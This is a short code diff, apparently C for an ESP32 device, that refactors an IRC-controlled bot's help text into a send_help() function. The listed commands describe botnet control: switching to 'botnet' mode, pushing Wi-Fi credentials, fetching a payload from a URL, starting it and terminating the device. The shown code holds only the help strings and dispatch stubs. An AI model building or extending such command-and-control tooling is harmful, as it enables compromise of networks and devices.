@@ -101,6 +101,15 @@ void init_timer(void) {
     ESP_ERROR_CHECK(esp_timer_start_once(history_timer, 5000000));
 }
 
+void send_help(void) {
+    send_message("MODE,<[AUTO,BOT]> - change between autonomous and botnet mode");
+    send_message("WIFI,<SSID>,<PASS> - send wifi credentials");
+    send_message("PAYLOAD,<URL> - send url of the payload");
+    send_message("INIT - initiate the payload");
+    send_message("IRC_DISCONN - disconnect from server");
+    send_message("TERMINATE - terminate the device");
+}
+
 void handle_messages(void) {
     init_timer();
 
@@ -111,12 +120,7 @@ void handle_messages(void) {
             send_pong();
         } else if (received_history && strstr(rx_buffer, "PRIVMSG")) {
             if(strstr(rx_buffer, ":HELP")) {
-                send_message("MODE,<[AUTO,BOT]> - change between autonomous and botnet mode");
-                send_message("WIFI,<SSID>,<PASS> - send wifi credentials");
-                send_message("PAYLOAD,<URL> - send url of the payload");
-                send_message("INIT - initiate the payload");
-                send_message("IRC_DISCONN - disconnect from server");
-                send_message("TERMINATE - terminate the device");
+                send_help();
             } else if (strstr(rx_buffer, ":MODE,AUTO")){
                 send_message("Switching to autonomous mode!");
             } else if (strstr(rx_buffer, ":MODE,BOT")){
